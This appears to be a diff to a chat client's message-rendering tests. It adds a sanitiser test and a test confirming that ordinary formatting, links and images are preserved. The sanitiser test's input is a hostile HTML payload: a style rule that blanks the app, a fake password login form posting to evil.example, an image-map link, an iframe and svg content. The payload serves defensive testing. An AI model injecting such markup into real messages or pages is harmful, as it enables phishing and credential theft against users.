@@ -138,6 +138,43 @@ describe("MessageRow", () => {
     expect(styled?.style.color).toBe("red");
   });
 
+  it("strips what would restyle the app or navigate it away", () => {
+    // A stock client's source tab or a bot can send any markup at all: a
+    // `<style>` applies to the whole window, and a form or an image map
+    // navigates it to the sender's page without the link guard seeing it.
+    const { container } = draw(
+      message({
+        body:
+          "x<style>*{display:none}</style>" +
+          '<form action="https://evil.example/p"><input type="password"><button formaction="https://evil.example/b">Login</button></form>' +
+          '<map name="m"><area href="https://evil.example/a"></map>' +
+          '<iframe srcdoc="<b>x</b>"></iframe><svg><foreignObject><textarea></textarea></foreignObject></svg>',
+      }),
+    );
+
+    expect(
+      container.querySelector("style, form, input, button[formaction], map, area, iframe, svg, textarea"),
+    ).toBeNull();
+    expect(container.innerHTML).not.toContain("evil.example");
+    expect(container.textContent).toContain("x");
+  });
+
+  it("still draws the formatting, links, pictures and code a message carries", () => {
+    const png =
+      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+    const { container } = draw(
+      message({
+        body: `<b>bold</b> <a href="https://example.com/x">site</a> <img src="${png}" alt="cat" data-spoiler="1"><pre><code>let x = 1;</code></pre>`,
+      }),
+    );
+
+    expect(container.querySelector("b")?.textContent).toBe("bold");
+    const link = container.querySelector<HTMLAnchorElement>('a[href="https://example.com/x"]');
+    expect(link?.dataset["external"]).toBe("true");
+    expect(container.querySelector(`img[src="${png}"]`)).not.toBeNull();
+    expect(container.querySelector("pre code")?.textContent).toBe("let x = 1;");
+  });
+
   it("keeps the strip clear of it where the message carries no video", () => {
     draw(message({ body: "just words" }), { alwaysShowActions: true });
     expect(screen.queryByLabelText("Watch together")).toBeNull();
@@ -154,9 +191,7 @@ describe("MessageRow", () => {
 
     // The embed arrives on its own event well after the row first mounted.
     useAppStore.setState({
-      linkEmbeds: new Map([
-        [url, { url, type: "video", title: "Landing at Warsaw", site_name: "YouTube" }],
-      ]),
+      linkEmbeds: new Map([[url, { url, type: "video", title: "Landing at Warsaw", site_name: "YouTube" }]]),
     });
     rerender(
       withNebulaTheme(
@@ -1078,7 +1113,11 @@ describe("MessageRow self-mention", () => {
       act(() => vi.advanceTimersByTime(LONG_PRESS_MS - 1));
       expect(onContextMenu).not.toHaveBeenCalled();
       act(() => vi.advanceTimersByTime(1));
-      expect(onContextMenu).toHaveBeenCalledWith(message(), { x: 30, y: 40 }, expect.objectContaining({ editable: true }));
+      expect(onContextMenu).toHaveBeenCalledWith(
+        message(),
+        { x: 30, y: 40 },
+        expect.objectContaining({ editable: true }),
+      );
     } finally {
       vi.useRealTimers();
     }
@@ -1103,6 +1142,10 @@ describe("MessageRow self-mention", () => {
     const onContextMenu = vi.fn();
     draw(message(), { alwaysShowActions: true, onContextMenu });
     fireEvent.click(screen.getByLabelText("More options"));
-    expect(onContextMenu).toHaveBeenCalledWith(message(), expect.any(Object), expect.objectContaining({ editable: true }));
+    expect(onContextMenu).toHaveBeenCalledWith(
+      message(),
+      expect.any(Object),
+      expect.objectContaining({ editable: true }),
+    );
   });
 });
